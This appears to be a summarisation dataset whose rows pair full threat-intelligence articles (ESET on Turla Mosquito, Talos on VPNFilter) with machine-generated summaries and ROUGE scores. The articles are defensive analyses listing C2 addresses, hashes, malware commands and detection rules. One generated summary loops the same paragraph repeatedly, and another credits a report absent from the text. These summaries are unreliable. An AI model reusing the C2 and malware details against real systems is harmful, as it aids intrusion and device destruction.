(TTPs) used to exploit this vulnerability were exactly the same as those we identified previously for other exploits. One wonders if the threat actors behind a few of these identified campaigns are not in fact the same actor, who simply jumps from one hot vulnerability to another?In particular, the Monero wallet address used in this exploit is one of the constant data elements that tie these different attacks together.";"In February 2018, several Russian nuclear scientists were arrested for allegedly mining cryptocurrencies using computing resources located at a Russian nuclear warhead facility. Globally, cryptominers are rapidly increasing and spreading for an obvious reason: it's lucrative. Threat actors are also surfing this wave by using different kind of attacks to compromise not only personal computer but also servers. They are looking for powerful CPU resources to mine cryptocurrencies, such as Monero (XMR), among others, as fast as they can. The more infected machines they can get mining for them, the more money they can make. Over the last few months we have begun to see a switch away from traditional ransomware, most probably because fewer and fewer victims are paying the ransom. Experts are suggesting that victims not pay ransoms, as there is no guarantee that the cybercriminals will actually return access to their encrypted data. Moreover, as has been described a few times on this blog, most of the time getting back access to the original data is simply not technically possible. However, last year, we not only witnessed IoT malware embedding exploits to recruit more bots in their army, but also campaigns using exploits to deploy cryptocurrency miners onto those devices. That trend is even more popular today, with cybercriminals exploiting new critical vulnerabilities within days of the public release of patches. For example, the vulnerability disclosed on Drupal CMS in March was exploited just a few days after the patch was released. Drupal is an opensource content management system (CMS) that is powering millions of web sites around the world. The vulnerability, dubbed ""Drupalgeddon 2.0"" (CVE20";en;{'r': 0.8, 'p': 0.9894736842105263, 'f': 0.8847058774089965};{'r': 0.7158774373259053, 'p': 0.9884615384615385, 'f': 0.8303715621715155};{'r': 0.8, 'p': 0.9894736842105263, 'f': 0.8847058774089965}
https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/;Turla Mosquito: A shift towards more generic tools;"ESET researchers have observed a significant change in the campaign of the infamous espionage groupTurla is a notorious espionage group, and has been active for at least ten years. It came to light in 2008, when Turla breached the US Department of Defense [1]. Since then, there have been numerous security incidents involving Turla targeting several governments and sensitive businesses such as the defense industry [2].Our January 2018 white paper [3] was the first public analysis of a Turla campaign called Mosquito. We have also published indicators of compromise [4]. Since then, the campaign has remained very active and attackers have been busy changing their tactics to remain as stealthy as possible.Starting in March 2018, we observed a significant change in the campaign: it now leverages the open source exploitation framework Metasploit before dropping the custom Mosquito backdoor. It is not the first time Turla has used generic tools. In the past, we have seen the group using open-source password dumpers such as Mimikatz. However, to our knowledge, this is the first time Turla has used Metasploit as a first stage backdoor, instead of relying on one of its own tools such as Skipper [5].DistributionAs described in our earlier analysis [3], the typical vector of compromise of the Mosquito campaign is still a fake Flash installer, in reality installing both the Turla backdoor and the legitimate Adobe Flash Player. The typical targets are still embassies and consulates in Eastern Europe.We showed that the compromise happens when the user downloads a Flash installer from get.adobe.com through HTTP. Traffic was intercepted on a node between the end machine and the Adobe servers, allowing Turla's operators to replace the legitimate Flash executable with a trojanized version. The following image shows the different points where the traffic could, in theory, be intercepted. Please note that we believe the fifth possibility to be excluded, as, to the best of our knowledge, Adobe/Akamai was not compromised.Even though we were not able to spot traffic interception subsequently, we found a new executable that is still impersonating the Flash installer and is named flashplayer28_xa_install.exe. Thus, we believe the same method of initial compromise is still being used.AnalysisAt the beginning of March 2018, as part of our regular tracking of Turla's activities, we observed some changes in the Mosquito campaign. Even though they did not make use of groundbreaking techniques, this is a significant shift in Turla's Tactics, Techniques and Procedures (TTPs).Previously, the chain of compromise was a fake Flash installer dropping a loader and the main backdoor. The following figure summarizes the process.Recently, we observed a change in the way in which the final backdoor is dropped. Turla's campaign still relies on a fake Flash installer but, instead of directly dropping the two malicious DLLs, it executes a Metasploit shellcode and drops, or downloads from Google Drive, a legitimate Flash installer. Then, the shellcode downloads a Meterpreter, which is a typical Metasploit payload [6], allowing the attacker to control the compromised machine. Finally, the machine may receive the typical Mosquito backdoor. The figure below summarizes the new process.Because Metasploit is being used, we might also guess that an operator controls the exploitation process manually. The time frame of the attack was relatively short as the final backdoor was dropped within thirty minutes of the start of the compromise attempt.The shellcode is a typical Metasploit shellcode, protected using the shikata_ga_nai encoder [7] with seven iterations. The following screenshots show the encoded and the decoded payload.Once the shellcode is decoded, it contacts its C&C at https://209.239.115[.]91/6OHEJ, which directs the download of an additional shellcode. Based on our telemetry, we identified the next stage to be a Meterpreter. That IP address is already known as a previously-seen Mosquito C&C domain, psychology-blog.ezua[.]com, was resolving to it in October 2017.Finally, the fake Flash installer downloads a legitimate Adobe installer, from a Google Drive URL, and executes it to lull the user into thinking all went correctly.Additional toolsIn addition to the new fake Flash installer and Meterpreter, we observed the use of several other tools.A custom executable that only contains the Metasploit shellcode. This is used to maintain access to a Meterpreter session. It is saved to C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msupdateconf.exe , granting the executable persistence., granting the executable persistence. Another custom executable used to execute PowerShell scripts.The Mosquito JScript backdoor that uses Google Apps Script as its C&C server.Privilege escalation using the Metasploit module ext_server_priv.x86.dll [8].ConclusionIn this post, we have presented the evolutions of the Turla Mosquito campaign over the last few months. The major change we observed was the use of Metasploit, an open-source penetration testing project, as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla.For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com.C&Chttps://209.239.115[.]91/6OHEJhttps://70.32.39[.]219/n2DE3Link to the legitimate Flash installerhttps://drive.google[.]com/uc?authuser=0&id=1s4kyrwa7gCH8I5Z1EU1IZ_JaR48A7UeP&export=downloadIoCsFilename SHA1 SHA256 ESET detection name flashplayer28_xa_install.exe 33d3b0ec31bfc16dcb1b1ff82550aa17fa4c07c5 f9b83eff6d705c214993be9575f8990aa8150128a815e849c6faee90df14a0ea Win32/TrojanDownloader.Agent.DWY trojan msupdateconf.exe 114c1585f1ca2878a187f1ce7079154cc60db7f5 1193033d6526416e07a5f20022cd3c5c79b73e8a33e80f29f9b06cdc3cb12e26 Win32/Turla.DH trojan msupdatesmal.exe 994c8920180d0395c4b4eb6e7737961be6108f64 6868cdac0f06232608178b101ca3a8afda7f31538a165a045b439edf9dadf048 Win32/Turla.DH trojanReferences[1] B. KNOWLTON, ""Military Computer Attack Confirmed,"" New York Times, 25 08 2010. [Online]. Available: https://www.nytimes.com/2010/08/26/technology/26cyber.html?_r=1&ref=technology. [Accessed 09 04 2018].[2] MELANI, "" Technical Report about the Malware used in the Cyberespionage against RUAG,"" 23 05 2016. [Online]. Available: https://www.melani.admin.ch/melani/en/home/dokumentation/reports/technical-reports/technical-report_apt_case_ruag.html.[3] ESET, ""Diplomats in Eastern Europe bitten by a Turla mosquito,"" ESET, 01 2018. [Online]. Available: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf.[4] ESET, ""Mosquito Indicators of Compromise,"" ESET, 09 01 2018. [Online]. Available: https://github.com/eset/malware-ioc/tree/master/turlamosquito-indicators-of-compromise.[5] M. Tivadar, C. Istrate, I. Muntean and A. Ardelean, ""Pacifier APT,"" 01 07 2016. [Online]. Available: https://labs.bitdefender.com/wp-content/uploads/downloads/pacifier-apt/.[6] ""About the Metasploit Meterpreter,"" [Online]. Available: https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/.[7] ""Unpacking shikata-ga-nai by scripting radare2,"" 08 12 2015. [Online]. Available: http://radare.today/posts/unpacking-shikata-ga-nai-by-scripting-radare2/.[8] ""meterpreter/source/extensions/priv/server/elevate/,"" Rapid7, 26 11 2013. [Online]. Available: https://github.com/rapid7/meterpreter/tree/master/source/extensions/priv/server/elevate.Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It is used as a first stage for the custom Mosquito backdoor. This might be useful information for defenders performing incident response on attacks involving Turla. Metasploit is an opensource penetration testing project. It;en;{'r': 0.05555555555555555, 'p': 0.9354838709677419, 'f': 0.10488245825453141};{'r': 0.02947845804988662, 'p': 0.7878787878787878, 'f': 0.05683060039759922};{'r': 0.05555555555555555, 'p': 0.9354838709677419, 'f': 0.10488245825453141}
https://blog.talosintelligence.com/vpnfilter/;New VPNFilter malware targets at least 500K networking devices worldwide;"For several months, Talos has been working with public- and private-sector threat intelligence partners and law enforcement in researching an advanced, likely state-sponsored or state-affiliated actor's widespread use of a sophisticated modular malware system we call ""VPNFilter."" We have not completed our research, but recent events have convinced us that the correct way forward is to now share our findings so that affected parties can take the appropriate action to defend themselves. In particular, the code of this malware overlaps with versions of the BlackEnergy malware -- which was responsible for multiple large-scale attacks that targeted devices in Ukraine. While this isn't definitive by any means, we have also observed VPNFilter, a potentially destructive malware, actively infecting Ukrainian hosts at an alarming rate, utilizing a command and control (C2) infrastructure dedicated to that country. Weighing these factors together, we felt it was best to publish our findings so far prior to completing our research. Publishing early means that we don't yet have all the answers -- we may not even have all the questions -- so this blog represents our findings as of today, and we will update our findings as we continue our investigation.Both the scale and the capability of this operation are concerning. Working with our partners, we estimate the number of infected devices to be at least 500,000 in at least 54 countries. The known devices affected by VPNFilter are Linksys, MikroTik, NETGEAR and TP-Link networking equipment in the small and home office (SOHO) space, as well at QNAP network-attached storage (NAS) devices. No other vendors, including Cisco, have been observed as infected by VPNFilter, but our research continues. The behavior of this malware on networking equipment is particularly concerning, as components of the VPNFilter malware allows for theft of website credentials and monitoring of Modbus SCADA protocols. Lastly, the malware has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide.The type of devices targeted by this actor are difficult to defend. They are frequently on the perimeter of the network, with no intrusion protection system (IPS) in place, and typically do not have an available host-based protection system such as an anti-virus (AV) package. We are unsure of the particular exploit used in any given case, but most devices targeted, particularly in older versions, have known public exploits or default credentials that make compromise relatively straightforward. All of this has contributed to the quiet growth of this threat since at least 2016.This post provides the technical findings you would normally see in a Talos blog. In addition, we will detail some thoughts on the tradecraft behind this threat, using our findings and the background of our analysts, to discuss the possible thought process and decisions made by the actor. We will also discuss how to defend against this threat and how to handle a device that may be infected. Finally, we will share the IOCs that we have observed to this point, although we are confident there are more that we have not seen.Brief technical breakdownThe VPNFilter malware is a multi-stage, modular platform with versatile capabilities to support both intelligence-collection and destructive cyber attack operations.The stage 1 malware persists through a reboot, which sets it apart from most other malware that targets internet-of-things devices because malware normally does not survive a reboot of the device. The main purpose of stage 1 is to gain a persistent foothold and enable the deployment of the stage 2 malware. Stage 1 utilizes multiple redundant command and control (C2) mechanisms to discover the IP address of the current stage 2 deployment server, making this malware extremely robust and capable of dealing with unpredictable C2 infrastructure changes.The stage 2 malware, which does not persist through a reboot, possesses capabilities that we have come to expect in a workhorse intelligence-collection platform, such as file collection, command execution, data exfiltration and device management. However, some versions of stage 2 also possess a self-destruct capability that overwrites a critical portion of the device's firmware and reboots the device, rendering it unusable. Based on the actor's demonstrated knowledge of these devices, and the existing capability in some stage 2 versions, we assess with high confidence that the actor could deploy this self-destruct command to most devices that it controls, regardless of whether the command is built into the stage 2 malware.In addition, there are multiple stage 3 modules that serve as plugins for the stage 2 malware. These plugins provide stage 2 with additional functionality. As of this writing, we are aware of two plugin modules: a packet sniffer for collecting traffic that passes through the device, including theft of website credentials and monitoring of Modbus SCADA protocols, and a communications module that allows stage 2 to communicate over Tor. We assess with high confidence that several other plugin modules exist, but we have yet to discover them.Tradecraft discussionWe assess with high confidence that this malware is used to create an expansive, hard-to-attribute infrastructure that can be used to serve multiple operational needs of the threat actor. Since the affected devices are legitimately owned by businesses or individuals, malicious activity conducted from infected devices could be mistakenly attributed to those who were actually victims of the actor. The capabilities built into the various stages and plugins of the malware are extremely versatile and would enable the actor to take advantage of devices in multiple ways.Advanced threat actors, including nation-states, will try to make attribution of their cyber activities extremely difficult, unless it is in their interest for it to be openly known that they conducted a specific act. To this end, advanced threat actors use multiple techniques, including co-opting infrastructure owned by someone else to conduct their operations. The actor could easily use devices infected with this malware as hop points before connecting to their final victim in order to obfuscate their true point of origin.The malware can also be leveraged to collect data that flows through the device. This could be for straightforward data-collection purposes, or to assess the potential value of the network that the device serves. If the network was deemed as having information of potential interest to the threat actor, they may choose to continue collecting content that passes through the device or to propagate into the connected network for data collection. At the time of this posting, we have not been able to acquire a third-stage plugin that would enable further exploitation of the network served by the device. However, we have seen indications that it does exist, and we assess that it is highly likely that such an advanced actor would naturally include that capability in malware that is this modular.Finally, this malware could be used to conduct a large-scale destructive attack by using the ""kill"" command, which would render some or all of the physical devices unusable. This command is present in many of the stage 2 samples we've observed, but could also be triggered by utilizing the ""exec"" command available in all stage 2 samples. In most cases, this action is unrecoverable by most victims, requiring technical capabilities, know-how, or tools that no consumer should be expected to have. We are deeply concerned about this capability, and it is one of the driving reasons we have been quietly researching this threat over the past few months.Observed activities of concernAs we have researched this threat, we have put into place monitoring and scanning to gain an understanding of the scope of this threat and the behaviors of infected devices. Our analysis has shown that this is a global, broadly deployed threat that is actively seeking to increase its footprint. While our research continues, we have also observed activity potentially associated with this actor that indicates possible data exfiltration activity.In early May, we observed infected devices conducting TCP scans on ports 23, 80, 2000 and 8080. These ports are indicative of scanning for additional Mikrotik and QNAP NAS devices, which can be found using these ports. These scans targeted devices in more than 100 countries.We also used our telemetry to discover potentially infected devices globally. We evaluated their collective behavior to try and identify additional features of the C2 infrastructure. Many of these victim IPs appeared to demonstrate behavior that strongly indicated data exfiltration.Finally, on May 8, we observed a sharp spike in VPNFilter infection activity. Almost all of the newly acquired victims were located in Ukraine. Also of note, a majority of Ukrainian infections shared a separate stage 2 C2 infrastructure from the rest of the world, on IP 46.151.209[.]33. By this point, we were aware of the code overlap between BlackEnergy and VPNFilter and that the timing of previous attacks in Ukraine suggested that an attack could be imminent. Given each of these factors, and in consultation with our partners, we immediately began the process to go public before completing our research.As we continued to move forward with the public disclosure, we observed another substantial increase in newly acquired VPNFilter victims focused in Ukraine on May 17. This continued to drive our decision to publish our research as soon as possible.Diagram 1. New observed VPNFilter infections over timeDefending against this threatDefending against this threat is extremely difficult due to the nature of the affected devices. The majority of them are connected directly to the internet, with no security devices or services between them and the potential attackers. This challenge is augmented by the fact that most of the affected devices have publicly known vulnerabilities which are not convenient for the average user to patch. Additionally, most have no built-in anti-malware capabilities. These three facts together make this threat extremely hard to counter, resulting in extremely limited opportunities to interdict malware, remove vulnerabilities, or block threats.Despite these challenges, Talos has released protections for this threat from multiple angles, to try to take advantage of the limited options that exist. We developed and deployed more than 100 Snort signatures for the publicly known vulnerabilities for the devices that are associated with this threat. These rules have been deployed in the public Snort set, and can be used by anyone to help defend their devices. In addition, we have done the usual blocklisting of domains/IPs as appropriate and convicting of the hashes associated with this threat to cover those who are protected by the Cisco Security ecosystem. We have reached out to Linksys, Mikrotik, Netgear, TP-Link and QNAP regarding this issue. (Note: QNAP has been aware of certain aspects of VPNFilter and previously done work to counter the threat.) Finally, we have also shared these indicators and our research with international law enforcement and our fellow members of the Cyber Threat Alliance in advance of this publication so they could move quickly to help counter this threat more broadly.RecommendationsWe recommend that:Users of SOHO routers and/or NAS devices reset them to factory defaults and reboot them in order to remove the potentially destructive, non-persistent stage 2 and stage 3 malware.Internet service providers that provide SOHO routers to their users reboot the routers on their customers' behalf.If you have any of the devices known or suspected to be affected by this threat, it is extremely important that you work with the manufacturer to ensure that your device is up to date with the latest patch versions. If not, you should apply the updated patches immediately.ISPs work aggressively with their customers to ensure their devices are patched to the most recent firmware/software versions.Due to the potential for destructive action by the threat actor, we recommend out of an abundance of caution that these actions be taken for all SOHO or NAS devices, whether or not they are known to be affected by this threat.Multi-Stage Technical DetailsExploitationAt the time of this publication, we do not have definitive proof on how the threat actor is exploiting the affected devices. However, all of the affected makes/models that we have uncovered had well-known, public vulnerabilities. Since advanced threat actors tend to only use the minimum resources necessary to accomplish their goals, we assess with high confidence that VPNFilter required no zero-day exploitation techniques.Stage 1 (persistent loader)VPNFilter's stage 1 malware infects devices running firmware based on Busybox and Linux, and is compiled for several CPU architectures. The main purpose of these first-stage binaries is to locate a server providing a more fully featured second stage, and to download and maintain persistence for this next stage on infected devices. It is capable of modifying non-volatile configuration memory (NVRAM) values and adds itself to crontab, the Linux job scheduler, to achieve persistence. This is a departure from previous IoT malware, like Mirai, which is ephemeral and disappears with a simple device reboot.Talos analyzed samples for MIPS and x86 processors. The C2 communication and additional malware downloads occur over Tor or SSL-encrypted connections. While the binaries themselves are not obfuscated beyond being stripped, some strings are stored in an encrypted form, and are only decrypted at runtime. The decryption routine looked suspiciously similar to RC4 in the static analysis, but it looks like the malware authors got the initialization of the S-boxes wrong. During the permutation step, values are XOR'd, but not swapped. Analysis of this RC4 implementation shows that it is identical to the implementation used in BlackEnergy, which is believed by law enforcement agencies to originate with a state actor.The RC4 initialization XORs the values in the permutation phase of the internal state initialization. As you can see in the last basic block, the code doesn't swap the values of S[i] and S[j] (compared to the RC4 pseudo code below).Once the malware has completed initialization, it starts to download pages from the seed URLs. In the MIPS sample cache and all but one URL of the x86 sample, the URLs pointed to Photobucket.com, an image-sharing host. The malware downloads the first image from the gallery the URL is referencing, and then proceeds to extract the download server's IP address. The IP address is extracted from six integer values for GPS latitude and longitude in the EXIF information.If stage 1 fails to connect to, download an image from, or successfully acquire an IP address via an image from Photobucket, the malware reaches out to a backup domain, toknowall[.]com, to download an image and attempt the same process.If the attempt to the backup domain fails, stage 1 opens a listener that waits for a specific trigger packet to open a connection for the actor to connect interactively to the device. When the listener opens, it checks its public IP from api.ipify[.]org and stores it for later comparison. Then, when any packet arrives on any port, the listener performs a series of checks to identify a trigger packet. If the packet meets a predefined set of criteria, it will extract an IP address from the packet and attempt a stage 2 download.Listener actions:Inspects all TCP/IPv4 packets with a SYN flag set Checks that the destination IP matches what it found when the listener opened (Note: if the listener failed to get an IP from api.ipify[.]org it will skip this check) Makes sure the packet has eight or more bytes Scans the data for the bytes \x0c\x15\x22\x2b The bytes directly after that 4-byte marker are interpreted as an IP so \x01\x02\x03\x04 becomes -> 1.2.3[.]4 Calls out to the newly received IP as usual for stage 2 Confirms that stage 2 is at least 1,001 bytes (Note: this is much smaller than the other callout methods which require the stage 2 to be 100,000 or more)Stage 2 (non-persistent)The stage 2 malware first sets up the working environment by creating a modules folder (/var/run/vpnfilterm) and a working directory (/var/run/vpnfilterw). Afterward, it will run in a loop, where it first reaches out to a C2 server, and then executes commands retrieved from the C2. The command names are encrypted with the same broken RC4 function as in stage 1. Fortunately, older versions of x86 stage 2 sample were very verbose, and debug printed all the steps it performed. Newer versions of the x86 stage 2 did not contain the debug prints, nor did the MIPS sample.The x86 sample can perform the following operations:kill: Overwrites the first 5,000 bytes of /dev/mtdblock0 with zeros, and reboots the device (effectively bricking it).exec: Executes a shell command or plugin.tor: Sets the Tor configuration flag (0 or 1).copy: Copies a file from the client to the server.seturl: Sets the URL of the current configuration panel.proxy: Sets the current proxy URL.port: Sets the current proxy port.delay: Sets the delay between main loop executions.reboot: Reboots the device if it has been up for more than 256 seconds, and the build name is specified in the parameter.download: Downloads a URL to a file. This can be applied to all devices or just a certain build name.The MIPS sample has the following additional operations:stop: Terminate the malware process.relay: A misspelled version of the `delay` command from the x86 version.Until the Tor module is installed, stage 2 will use one or more IPs stored in its configuration as SOCKS5 proxies to Tor and attempt to communicate with a control panel also found in its configuration. Like in stage 1, the communication between the malware and the proxy will connect over a verified SSL connection. When the Tor module is installed, it will connect to .onion domains through the local SOCKS5 proxy provided by the module over plain HTTP instead. We used a fake SOCKS5 proxy, which redirects all traffic to INetSim for analysis.An example request from the malware to the server:{""uq"":""px(01:02:03:04:05:06)"",""pv"":""pPRXi686QNAPX86"",""ad"":""10.0.0.1"",""bv"":""0.11.1a/0.3.9qa"",""nn"":""YnVpbGRyb290"",""tn"":"""",""on"":""1""}The malware encodes this request into a JSON object, which is then base64-encoded and sent to the path /bin32/update.php in the HTTP POST parameter ""me"". The user agent used in the request is peculiar (Mozilla/6.1 (compatible, MSIE 9.0, Windows NT 5.3, Trident/5.0)), as a version ""Windows NT 5.3"" doesn't exist.uq: A unique ID for the infected device (the MAC address of the malware's network interface).pv: The platform version the malware is running onad: The public IP address of the malware's devicebv: Version of the stage 1 loader (0.3.9qa) and the stage 2 binary (0.11.1a)nn: The node nametn: The Tor flagon: The onion flagThe server's response to the message:{""tr"":3060""pxs"":[""217.12.202.40"",""94.242.222.68"",""91.121.109.209""],""tor"":""tor 1"",""mds"":[]}The server's response to the message: { ""tr"":3060 ""pxs"":[""217.12.202.40"",""94.242.222.68"",""91.121.109.209""], ""tor"":""tor 1"", ""mds"":[] } tr: Sets the delay for the main loop.pxs: List of panels to connect to. These are the C2 servers.tor: Sets the name and version of the Tor module.mds: A list of modules to fetch. Each entry is in the format ""<command_id> <module_id> <module_name> <module_args (base64-encoded)>"". The malware will download the module from /bin32/update.php by setting the POST form parameter me to the module name with the architecture appended, e.g., tor_i686 for the Tor module, and execute it in each iteration. A blank list of commands (as in the example response above) will clear any existing commands by deactivating them and killing any running processes associated with them.Stage 3 (non-persistent)We have analyzed two plugin modules for the malware, a packet sniffer and a communication plugin that allows the malware to communicate over Tor. We assess with high confidence that there are likely several more that we have not yet discovered. Among the initial samples Talos acquired, there was a plugin for the MIPS stage 2, which is a packet sniffer. It intercepts all network traffic through a raw socket and looks for strings used in HTTP basic authentications. Further, it specifically tracks Modbus TCP/IP packets. The resulting log file is placed in the stage 2 working directory, /var/run/vpnfilterw. This allows the attackers to understand, capture, and track the traffic flowing through the device.The Tor plugin module is partially linked into stage 2, but has a separate Tor executable, which is downloaded to /var/run/tor and run in a process separate from stage 2. The Tor binary looks like the standard Tor client, in the form of a statically linked and stripped binary. It creates a configuration file in /var/run/torrc and a working directory in /var/run/tord.ConclusionVPNFilter is an expansive, robust, highly capable, and dangerous threat that targets devices that are challenging to defend. Its highly modular framework allows for rapid changes to the actor's operational infrastructure, serving their goals of misattribution, intelligence collection, and finding a platform to conduct attacks.The destructive capability particularly concerns us. This shows that the actor is willing to burn users' devices to cover up their tracks, going much further than simply removing traces of the malware. If it suited their goals, this command could be executed on a broad scale, potentially rendering hundreds of thousands of devices unusable, disabling internet access for hundreds of thousands of victims worldwide or in a focused region where it suited the actor's purposes.While the threat to IoT devices is nothing new, the fact that these devices are being used by advanced nation-state actors to conduct cyber operations, which could potentially result in the destruction of the device, has greatly increased the urgency of dealing with this issue. We call on the entire security community to join us in aggressively countering this threat.We will continue to monitor VPNFilter and work with our partners to understand the threat as it continues to evolve in order to ensure that our customers remain protected and the public is informed.IOCsAs stated previously, we highly suspect that there are additional IOCs and versions of this malware that we are not currently aware of. The following list of IOCs comprises what we know as of this date.Known C2 Domains and IPsAssociated with the 1st Stagephotobucket[.]com/user/nikkireed11/libraryphotobucket[.]com/user/kmila302/libraryphotobucket[.]com/user/lisabraun87/libraryphotobucket[.]com/user/eva_green1/libraryphotobucket[.]com/user/monicabelci4/libraryphotobucket[.]com/user/katyperry45/libraryphotobucket[.]com/user/saragray1/libraryphotobucket[.]com/user/millerfred/libraryphotobucket[.]com/user/jeniferaniston1/libraryphotobucket[.]com/user/amandaseyfried1/libraryphotobucket[.]com/user/suwe8/libraryphotobucket[.]com/user/bob7301/librarytoknowall[.]comAssociated with the 2nd Stage91.121.109[.]209217.12.202[.]4094.242.222[.]6882.118.242[.]12446.151.209[.]33217.79.179[.]1491.214.203[.]14495.211.198[.]231195.154.180[.]605.149.250[.]5491.200.13[.]7694.185.80[.]8262.210.180[.]229zuh3vcyskd4gipkm[.]onion/bin32/update.phpKnown File Hashes1st Stage Malware50ac4fcd3fbc8abcaa766449841b3a0a684b3e217fc40935f1ac22c34c58a9ec0e0094d9bd396a6594da8e21911a3982cd737b445f591581560d766755097d922nd Stage Malware9683b04123d7e9fe4c8c26c69b09c2233f7e1440f828837422ce330040782d17d6097e942dd0fdc1fb28ec1814780e6ecc169ec6d24f9954e71954eedbc4c70e4b03288e9e44d214426a02327223b5e516b1ea29ce72fa25a2fcef9aa65c4b0b9eb6c779dbad1b717caa462d8e040852759436ed79cc2172692339bc6243238737e29b0ea7a9b97597385a12f525e13c3a7d02ba4161a6946f2a7d978cc045b4776cb9a7a9f5afbaffdd4dbd052c6420030b2c7c3058c1455e0a79df0e6f7a1d8a20dc9538d639623878a3d3d18d88da8b635ea52e5e2d0c2cce4a8c5a703db10649fda8888d701eb2f91e6e0a05a2e2be714f564497c44a3813082ef8ff250b3rd Stage Pluginsf8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344afd281639e26a717aead65b1886f98d6d6c258736016023b4e59de30b7348719Self-Signed Certificate Fingerprintsd113ce61ab1e4bfcb32fb3c53bd3cdeee81108d02d3886f6e2286e0b6a006747c52b3901a26df1680acbfb9e6184b321f0b22dd6c4bb107e5e071553d375c851f372ebe8277b78d50c5600d0e2af3fe29b1e04b5435a7149f04edd165743c16dbe4715b029cbd3f8e2f37bc525005b2cb9cad977117a26fac94339a721e3f2a527af4b890db1a611d0054d5d4a7d9a36c9f52dffeb67a053be9ea03a495a9302110da84f31e7868ad741bcb0d9f7771a0bb39c44785055e6da0ecc393598adc8fb47ba27dceea486aab7a0f8ec5674332ca1f6af962a1724df89d658d470348fb25336c2dd388459dec37fa8d0467cf2ac3c81a272176128338a2c1d7c083c78cd75d3a70e3218688bdd23a0f618add964603736f7c899265b1d8386b9902526110da84f31e7868ad741bcb0d9f7771a0bb39c44785055e6da0ecc393598adc8909cf80d3ef4c52abc95d286df8d218462739889b6be4762a1d2fac1adb2ec2b044bfa11ea91b5559f7502c3a504b19ee3c555e95907a98508825b4aa56294e4c0f8bde03df3dec6e43b327378777ebc35d9ea8cfe39628f79f20b1c40c1b4128f1d0cd5dd6585c3d5d478e18a85e7109c8a88489c46987621e01d21fab5095dd5dec646c957305d91303a1d7931b30e7fb2f38d54a1102e14fd7a4b9f6e0806c0f8bde03df3dec6e43b327378777ebc35d9ea8cfe39628f79f20b1c40c1b412Known Affected DevicesThe following devices are known to be affected by this threat. Based on the scale of this research, much of our observations are remote and not on the device, so it is difficult to determine specific version numbers and models in many cases. It should be noted that all of these devices have publicly known vulnerabilities associated with them.Given our observations with this threat, we assess with high confidence that this list is incomplete and other devices could be affected.E1200E2500WRVS4400NMikrotik RouterOS Versions for Cloud Core Routers:101610361072Netgear Devices:DGN2200R6400R7000R8000WNR1000WNR2000QNAP Devices:TS251TS439 ProOther QNAP NAS devices running QTS softwareTP-Link Devices:R600VPNCoverageCisco customers are protected by this threat by Cisco Advanced Malware Protection (AMP), Cloud Web Security (CWS), Network Security, ThreatGrid, Umbrella, and Web Security Appliance (WSA). Additionally, StealthWatch and StealthWatch Cloud can be utilized to find devices communicating with the known C2 IP addresses and domains.In StealthWatch, two items need to be configured to send an alert that there are communications to nefarious IP addresses.The first step is to create a new Host Group named ""VPNFilter C2"" under Outside Hosts using the Java user interface.Once this is created, you will likely want to validate that there are no active communications presently occurring.This validation can be achieved by right-clicking on the recently created ""VPNFilter C2"" Host Group and navigating to Top -> Conversations -> Total.Once you are viewing these top conversations, you will easily be able to see if there is active traffic.In the event that there is no active traffic, an alarm can be created to generate alerts in the event that traffic to or from any of the ""VPNFilter C2"" hosts is observed.This alarm can be configured by creating a custom event and selecting the appropriate hosts or objects in the web user interface.VPNFilter specific Snort detection:45563 45564 46782 46783Snort rules that protect against known vulnerabilities in affected devices:25589 26276 26277 26278 26279 29830 29831 44743 46080 46081 46082 46083 46084 46085 46086 46287 46121 46122 46123 46124 41445 44971 46297 46298 46299 46300 46301 46305 46306 46307 46308 46309 46310 46315 46335 46340 46341 46342 46376 46377 37963 45555 46076 40063 44643 44790 26275 35734 41095 41096 41504 41698 41699 41700 41748 41749 41750 41751 44687 44688 44698 44699 45001 46312 46313 46314 46317 46318 46322 46323 40866 40907 45157ClamAV Signatures:Unix.Trojan.Vpnfilter-6425811-0Unix.Trojan.Vpnfilter-6425812-0Unix.Trojan.Vpnfilter-6550590-0Unix.Trojan.Vpnfilter-6550591-0Unix.Trojan.Vpnfilter-6550592-0";VPNFilter is a modular malware system used by a sophisticated cyberespionage group to target small office and home office (SOHO) routers and networkattached storage (NAS) devices. The malware is capable of stealing website credentials, monitoring Modbus SCADA protocols, and has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide. The type of devices targeted by this actor are difficult to defend. They are frequently on the perimeter of the network, with no intrusion protection system (IPS) in place, and typically do not have an available hostbased protection system such as an antivirus (AV) package. We are unsure of the particular exploit used in any given case, but most devices targeted, particularly in older versions, have known public exploits or default credentials that make compromise relatively straightforward. All of this has contributed to the quiet growth of this threat since at least 2016. The ITSecurity report provides an indepth analysis of the VPNFilter malware. The malware is a multistage, modular platform with versatile capabilities to support both intelligencecollection and destructive cyber attack operations. The stage 1 malware persists through a reboot, which sets it apart from most other malware that targets internetofthings devices because malware normally does not survive a reboot of the device. The main purpose of stage 1 is to gain a persistent foothold and enable the deployment of the stage 2 malware. Stage 1 utilizes multiple redundant command and control (C2) mechanisms to discover the IP address of the current 